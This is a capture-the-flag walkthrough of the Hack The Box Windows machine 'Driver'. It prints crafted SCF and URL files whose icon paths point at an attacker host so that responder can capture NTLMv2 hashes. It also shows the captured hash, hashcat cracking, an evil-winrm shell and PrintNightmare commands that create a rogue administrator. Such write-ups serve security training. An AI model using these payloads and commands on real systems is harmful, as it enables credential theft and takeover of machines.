---
layout: single
title: "Walktrough: HTB Driver"
namespace: htb-driver
category: Walkthrough
tags:
  - HackTheBox
  - HTB Easy
  - HTB Windows
date: 2021-07-03 16:00:00
header:
   teaser: https://i.imgur.com/T9F3vYj.png
---

Hello guys!

This week's machine will be **Driver**, an easy-rated Windows box from [Hack The Box](https://www.hackthebox.eu/), created by [MrR3boot](https://app.hackthebox.com/users/13531). <!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Driver](https://i.imgur.com/Q7q1Nyx.png){: .align-center}

This was a pretty interesting box, where the most challenging part of this box was getting the initial foothold, where we needed to play with some attributes on very special Windows Explorer Files. To get SYSTEM, we could use several methods but once its name, picture, and all context (printing drivers/firmware, etc) allude to Printing Services, **PrintNightmare** was the chosen method to get the final flag :smile:.

I hope you guys enjoy it!

## Enumeration

As usual, started with a quick `nmap` scan to list available services in this box.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.11.106
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-11 16:25 -03
Nmap scan report for 10.10.11.106
Host is up (0.11s latency).
Nmap scan report for 10.10.11.106                                                                                                                                                                        [0/2843]Host is up (0.11s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-01-12T02:25:38
|_  start_date: 2022-01-11T20:15:37
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.91 seconds
```

Besides the identified ports listed in the scan above, ran also a quick full scan and was identified port **5985/TCP**, which can be Powershell Remoting/WinRM.

### 80/TCP

Starting with the HTTP page, noticed that a sign-in prompt for basic authentication was shown, to which I have tested default credentials once prompt was requesting *a password for user **admin***, so had success using the credentials **admin:admin**, showing us the following page:

![HTB Driver - MFP Firmware Update Center - Home](https://i.imgur.com/BNm9Su7.png){: .align-center}

From the existing pages, the only one containing a link was **Firmware Updates**, which allow us to upload a file for verification where you can also provide a printer model. For this page, I have tried several file updates while executing a `gobuster dir` brute-forcing, to find the upload folder and eventually be able to upload a reverse shell but I had no success on this.

![HTB Driver - MFP Firmware Update Center - Firmware Updates](https://i.imgur.com/g5ywY2g.png){: .align-center}

As the page mentions that the testing team will review the uploaded files soon, I have tried to upload several exploits using formats like `*.bat` , `*.cmd` and `*.exe` but none of them worked as expected.

While thinking in a way to get this working, I was reviewing techniques for Windows and Active Directory at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share) where I found the section in the article discussing some file formats like `*.scf` and `*.url` that could allow us, in conjunction with `responder`, to harvest credentials of any user or service that access those files.

This is achieved without any interaction when the account access file metadata and tries to reach icons located in an external resource. I have done this successfully by using both of the files below that don't look malicious at first look but will provide us users' hashes :smile:.

- SCF

```ini
[Shell]
Command=2
IconFile=\\10.10.10.10 \Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

- URL

```ini
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.10.10.10 \%USERNAME%.icon
IconIndex=1
```

To collect those hashes, we need to keep the `responder` active, which was done by using the command `responder -wrf --lm -v -I tun0`

```plaintext
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:e526043e3ab890d9:2C8F15DD548D0CD4733DA15557F48354:010100000000000080BEA0C31C07D801BB26CAA8FCE04AB00000000002000800590041004A004B0001001E00570049004E002D0059004100370051004E004D0048004D0046004300560004003400570049004E002D0059004100370051004E004D0048004D004600430056002E00590041004A004B002E004C004F00430041004C0003001400590041004A004B002E004C004F00430041004C0005001400590041004A004B002E004C004F00430041004C000700080080BEA0C31C07D80106000400020000000800300030000000000000000000000000200000AC8DFA9895EEC505FD321FAD1F05A3B916ACF768F4F669947F035A42E58652BC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0031003300000000000000000000000000
```

Now in possession of `tony`'s hash, we can use `hashcat` to crack his password, returning the password **liltony**.

```bash
hashcat -a 0 -m 5600 tony /usr/share/wordlists/rockyou.txt
```

### 445/TCP - SMB Service

Once we have now `tony`'s credentials, we can keep enumerating other services like SMB, but unfortunately, there's no writable share that we could abuse at this moment.

```bash
$ smbmap -u tony -p liltony -H driver.htb
[+] IP: driver.htb:445  Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

No write access in `ADMIN$` and `C$` also means that `psexec` and `wmiexec` will not work. The other possible method is WinRM, previously identified, so I have used the [evil-winrm](https://github.com/Hackplayers/evil-winrm) to get an interactive shell in this box and be able to read the user's flag.

```bash
$ evil-winrm -i 10.10.11.106 -u tony -p liltony

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> get-content ..\desktop\user.txt
<redacted>
```

## Root flag

Now that we have an interactive prompt, we can start enumerating this box to find a privilege escalation opportunity.

The first option is based on an unpatched Operating System vulnerability, so, to get started on that, we need to know first which OS version and patch level we have at this moment

```bash
PS C:\Users\tony\Documents> [System.Environment]::OSVersion

Platform ServicePack Version      VersionString
-------- ----------- -------      -------------
 Win32NT             10.0.10240.0 Microsoft Windows NT 10.0.10240.0

*Evil-WinRM* PS C:\Users\tony\Documents> cmd /c ver

Microsoft Windows [Version 10.0.10240]
```

Based on the output above, both OSEnvironment and Windows `ver` command shows us that this is a Windows 10 build 1507, build number 10240 as we can see at [Windows 10 - release information | Microsoft Docs](https://docs.microsoft.com/en-us/windows/release-health/release-information).

As this Windows version is the first Windows as a Service Release, it has been unsupported since 2017, any vulnerability that could allow us to escalate to System will work.

As this machine was released in October 2021 and its services relate to Print Services, is inevitable to remember https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527), which happened in July 2021, very hot topic when this box was released.

Doing a quick search on this CVE and related CVE-2021-1675, found this blog post on [Playing with PrintNightmare | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html). Based on the blog post, also made use of exploit code from [Caleb Stewart and John Hammond](https://github.com/calebstewart/CVE-2021-1675) and it worked as expected! Below are the steps to get the root flag:

- Cloned repository and uploaded its contents to the target machine using `evil-winrm` **upload** command

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> upload /opt/dcruz/tools/CVE-2021-1675
Info: Uploading /opt/dcruz/tools/CVE-2021-1675 to C:\Users\tony\Documents\CVE-2021-1675


Data: 170824 bytes of 170824 bytes copied

Info: Upload successful!
```

- Then imported Module and executed command as sample in Author's repository:

```bash
*Evil-WinRM* PS C:\Users\tony\Documents\CVE-2021-1675> import-module .\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents\CVE-2021-1675> invoke-nightmare -driverName "Xerox" -newUser "zurc" -newPassword "P@ssw0rd"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user zurc as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
[htb] 0:ruby*                                                                     
```

- After execution, opened a new instance of `evil-winrm` using credentials recently created and was able to read root's flag :smile:

```bash
*Evil-WinRM* PS C:\Users\zurc\Documents> whoami
driver\zurc
*Evil-WinRM* PS C:\Users\zurc\Documents> get-content c:\users\administrator\desktop\root.txt
<redacted>
```

I hope you guys have enjoyed it! :smiley:

See you in the next post!
